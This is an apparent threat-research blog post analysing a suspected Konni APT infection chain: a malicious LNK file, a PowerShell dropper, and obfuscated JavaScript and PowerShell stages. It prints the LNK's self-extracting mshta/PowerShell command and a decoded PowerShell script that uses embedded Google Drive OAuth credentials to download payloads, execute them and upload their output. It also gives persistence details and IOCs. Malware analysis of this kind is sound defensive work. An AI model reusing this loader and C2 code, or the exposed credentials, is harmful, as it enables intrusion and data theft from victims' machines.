
# Contents

- Introduction.
- Overview.
- Technical Analysis.
    - Analyzing LNK file.
    - Analysis of PS1 file.
    - Analysis of ZIP file.
        - Analysis of 26545.tmp
        - Analysis of AN9385.tmp
- IOCs
- Conclusion

# Introduction

Hello everyone, in this post, I will be analyzing a campaign which is suspected by the Konni APT group. In my previous study on Kimsuky, I came across some de-obfuscation techniques that seem similar in this set of samples also, which gives me more confidence.  In this blog, I will discuss these techniques in more detail.

The malware sample I’m analyzing had been posted on [this post](https://x.com/0xmh1/status/1904097297958596662). In this post, I will break down its execution flow, how it operates, and its working in-depth . Stay tuned for a deep dive into its behavior and techniques!

# Overview

In this campaign, the malware initially enters the victim’s system through a malicious LNK file. This LNK file contains an unreserved section where the initial malicious code is stored. Afterward, the file downloads additional payloads from the command-and-control (C2) server, which is Dropbox. Then the LNK file then drops a ZIP file, and when extracted, it contains a JavaScript file and another obfuscated PowerShell file. The main goal of the malware is to steal data, which we’ll explore in the following sections. Let’s move on.

# Technical Analysis

First, let’s take a look at how the first LNK file that connects to the C2 servers and drops the malicious files. As, previously discussed, I will write these analysis in multiple parts. 

## Analyzing LNK file

Upon analyzing the LNK file I found that the  `sLinkTargetIDList` of the LNK file points to `mshta.exe`, which is mostly used to execute HTA or JavaScript files. The command-line arguments for this file are as follows:

 

```bash
javascript:a="pow"+"ershell -ep bypa"+"ss ";g="c:\\pro"+"gramdata\\";m=" -Encoding Byte;sc ";p="$w ([byte[]]($f "+"| select -Skip 0x08e4)) -Force";s="a=new Ac"+"tiveXObject('WSc"+"ript.Shell');a.Run(c,0,true);close();";c=a+"-c $t=0x17cb;$k = Get-ChildItem *.lnk | where-object {$_.length -eq $t} | Select-Object -ExpandProperty Name;if($k.co"+"unt -eq 0){$k=G"+"et-ChildItem $env:TEMP\\*\\*.l"+"nk | where-object{$_.length -eq $t};};$w='"+g+"e.ps1';$f=gc $k"+m+p+m+g+"3246 0;"+a+"-f $w;";eval(s);
```

This code searches for a `.lnk` file, first checking the same folder. If it's not found, it looks in the TEMP folder for a `.lnk` file with a specific size of `0x17CB` (that is specifically of 6091 bytes), once I checked the size which it is looking for, I found that the size is same as this LNK file. Once the file is found, it skips the first `0x08E4` bytes (Dec: 2276) and extracts the remaining data as bytecode using `-Encoding Byte`. This extracted data is saved as `e.ps1` inside the `C:\ProgramData\` folder, and then the script executes the `e.ps1` file. Therefore, this LNK file contains extra code which is extracting the malicious PowerShell from the existing file itself and saving it to a file. 

![image](https://github.com/user-attachments/assets/53a30664-94c5-4da2-b0df-b4b3a85075f6)

![image](https://github.com/user-attachments/assets/756c38f5-f26c-4782-8ac7-2c99ae599a45)

Upon clearly extracting the content from the LNK file, I found that this is the obfuscated code extracted from the `e.ps1` file. 



## Analysis of PS1 file

Now, we will analyze the contents of the `e.ps1` file and break down its functionality.

![image](https://github.com/user-attachments/assets/1dd145d8-7c06-4201-b3d3-06f2fcaf7013)


The script is written in PowerShell and is executed using `CreateRunspacePool`. It establishes a connection with a malicious IP address which can also be said to be as the command-and-control server (`64.20.59.148`) through ports `8855` and `6699`.

![image](https://github.com/user-attachments/assets/dfb5a08e-1826-46b4-bae7-8c4f70d12d1c)


The `e.ps1` script then downloads a ZIP file (`gs.zip`) from a Dropbox C2 server and extracts its contents to the `C:\ProgramData` directory. The extracted files includes two file  `26545.tmp` and `AN9385.tmp`. Then, to ensure persistence, the malware schedules the script inside  `26545.tmp` to run every 5 minutes using a scheduled task. The malicious scheduled task is masked as `AGMicrosoftEdgeUpdateExpanding[7923498737]`, and execution is done via `wscript.exe` windows binary.

Another persistence method The script uses is that it also saves this file in the registry path `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, ensuring that it executes automatically whenever the user logs in which is basically using `Run keys` for persistence. Additionally, the script retrieves the contents of `AN9385.tmp` using the `Get-Content` method and executes the commands stored in it. After execution, the script pauses for 120 milliseconds before proceeding.

The malicious PowerShell script connects to the IP address on port `8855` and reads data from the server. The received data is encoded in Base64, which the script decodes using `DecodeByte`. It then saves the decoded content as `N9371.js` and also stores it in the registry under the filename `38243.tmp`. After saving the file, the script closes the network connection.

Next, the script uses `$commandReader.Peek()` to check for data on port `6699` from the same IP address. If data is found, it is retrieved into the `CommandData` variable. The script then saves this data in the `C:\ProgramData\tmps1` directory and forcefully executes the script. Once the execution is complete, it deletes the `tmps1` file .

## Analysis of ZIP file

Now, let's analyze the code of the two extracted files from the zip file: `26545.tmp` and `AN9385.tmp`. We will examine their functionality and how they contribute to the overall execution of the malware.

### Analysis of 26545.tmp

Once I started analyzing I found that the JavaScript file is obfuscated and contains functions and variables, which are not normal, so upon figuring out and understanding I found a few things that there are three-four functions, I will now analyze them.

![image](https://github.com/user-attachments/assets/ce0202d4-1ea3-4fdb-9095-d62c465cc1c8)

The function `Zucg7ug4` returns an array of obfuscated strings. These strings are later processed to concatenate and execute a hidden PowerShell command.

![image](https://github.com/user-attachments/assets/2363c756-345a-43e1-a53c-57f11dcaf9ad)

The other function takes two arguments: a string containing the malicious PowerShell script and the number `840.8`. It repeatedly checks whether the desired level of obfuscation is achieved by calling another function, `Wyds7g4geb`. If the obfuscation is not proper, it shuffles the obfuscated strings until the required form is obtained.

![image](https://github.com/user-attachments/assets/75166943-dfcc-4790-9612-e203c8e28764)

The variable **`sf4`** in the function represents an array of strings. When the function **`Wyds7g4geb`** is called with parameters **`_Index**` and **`_DummyVar2`**, it first retrieves the array **`sf4`** by calling **`Zucg7ug4()`**, which returns a predefined set of obfuscated strings.

Next, the function computes an index by subtracting **`0x106`** from the given **`_Index`** parameter and then taking the remainder when divided by the length of the **`sf4`** array. This ensures that the index remains within the valid range of the array.

Finally, the function fetches the corresponding value from the **`sf4`** array using this computed index and returns it to the calling function.

![image](https://github.com/user-attachments/assets/e90dcdbc-8130-43a7-b4ef-92ba376febc1)

Once the strings are shuffled correctly, the function concatenates them while removing unnecessary parts. Finally, it executes the script. 

```bash
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ep bypass -command $fn='C:\ProgramData\AN9385.tmp';$d = Get-Content $fn; Invoke-Expression $d;
```

This is the JavaScript extracted from the string array, and after analyzing it, I found that it executes the `AN9385.tmp` file using `powershell.exe`.Next, I will analyze the `AN9385.tmp` file and its workflow.

### Analysis of AN9385.tmp

Once I started analyzing I found that the PowerShell file is little obfuscated and mostly encoded by confirming that it contains functions and variables, which are not normal, so upon figuring out and understanding, I will now analyze them.

![image](https://github.com/user-attachments/assets/4bea4310-a3c8-4488-a74f-d19262675c97)


This is the encoded code given in the file. It is encoded in base64 . So I have decoded the code using `base64.b64decode()` function , so now let’s analyze the work flow of the code.

After manually de-obfuscating the file, I found out that this file is a complete PowerShell script. Let us move on to the working of the script. 

```bash
$objName = "eee"
$folderId = "1ktR0YQGBIz82IJb6vezlsKEbkUdv6l0L";
$clientId = "65054017293-3uhs23bl4ffvlbutclecn1ptrvine0sm.apps.googleusercontent.com";
$secret = "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";
$redirectURI = "urn:ietf:wg:oauth:2.0:oob";
$refreshToken = "1//04ToWctErvUASCgYIARAAGAQSNwF-L9IrVRaC8sjBbltEggBleQJlFRerA3iNqQiF_1SQq_s9Q7IinKdzPIweTobvWtN3RWgV8kg";
```

The script first contains user credentials which is used to authenticate with Google Drive. It includes the object name, folder ID, client ID, client secret, and redirect URI. To generate a new authentication token, it uses a refresh token stored in the `$refreshToken` variable.

```bash
$refreshTokenParams = @{
      client_id=$clientId;
      client_secret=$secret;
      refresh_token=$refreshToken;
      grant_type='refresh_token';
}
$refreshedToken = Invoke-WebRequest -Uri "https://www.googleapis.com/oauth2/v4/token" -Method POST -Body $refreshTokenParams  | ConvertFrom-Json

$accesstoken = $refreshedToken.access_token
```

These credentials are then stored in the `$refreshTokenParams` variable, which is used to send an HTTP request to Google's authentication server at `https://www.googleapis.com/oauth2/v4/token`. The request is made using the `Invoke-WebRequest` cmdlet, and the response is converted into JSON format. 

Finally, the script extracts the access token from the response and stores it in the `$accesstoken` variable, which will be used for further authentication. And then it will generate an authenticated HTTP header.

![image](https://github.com/user-attachments/assets/775ce04c-d80d-45cc-8a1c-30a828e19b90)

The script calls the `UploadLog` function, which records the current time when the script is executed. It then converts the current date and time into a Base64-encoded string. After that, it creates a variable `$uploadMetadata` to store the file name in the format `$objName + "__" + $curTime + "_Result_log.txt"`, along with the target folder where the file will be saved.

Next, the script constructs an HTTP request to Google Drive using an authenticated HTTP header and an HTTP body. The response from Google Drive is then stored in the variable `$response`.

Then, the script generates a query to search for files on Google Drive using the Google APIs. It looks for files named with `$objName` that were sent in the HTTP header. However, the filename should not contain the word "result," and the file type should not be a folder. The script then sends this query to the URL `hxxps://www[.]googleapis[.]com/drive/v3/files` to find the matching files.

In response, the C2 server sends back the corresponding file name and ID (if available) to the victim's PC.

![image](https://github.com/user-attachments/assets/521f35e0-6f68-4072-87b8-311910924eea)


After receiving the names and IDs of the files, the script downloads the malicious files one by one from Google Drive and saves them in the `C:\ProgramData\` folder. Once the file is retrieved on the victim’s PC, the script deletes it from the C2 server. Then, the script executes the file and stores the output in the `$Output` variable. Finally, it uploads the output to the C2 server and deletes the malicious file from the victim's system after sending the data.

# IOCs

`6fb3dfe451b37b0304a42e62759bf3670d5b4dd0232621dac0739061fa4704e2`

`1a61340179c811b17c332452cfd1d7277d615697a6993ca870834b91e7070975`

`9ce42177bafe552495b8329726bb4acfcb5f9e886377a2e76fb901fa01ae407c`

`ec78b61a5f54805bbdffd69d57ce76db41d1adbb85c544688769eacf29d928cb`

`a1376496406895a00d9009b36a6e1073553f3198502a71d33d7438e68914261a`

`hxxps://www.dropbox.com/scl/fi/ouck6s5mxghmwz57tzkzj/Sm.dat?rlkey=2a6qys5xgufg2ouk93or0vmcr&st=zzaqdclb&dl=1`

`64[.]20[.]59[.]148` 

# Conclusion

Thanks all for reading this blog, I have made a research according to my understanding . If you want to give any feedback , feel free to reach me out.
